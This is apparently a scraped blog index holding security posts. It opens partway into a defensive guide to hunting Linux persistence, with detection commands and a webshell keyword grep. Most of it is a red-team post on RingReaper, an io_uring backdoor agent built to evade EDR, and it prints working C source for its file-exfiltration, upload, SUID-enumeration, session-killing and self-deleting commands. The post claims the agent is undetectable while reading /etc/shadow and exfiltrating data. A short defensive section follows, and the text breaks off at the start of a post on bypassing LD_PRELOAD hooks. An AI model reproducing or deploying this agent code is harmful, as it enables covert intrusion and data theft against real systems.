is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so 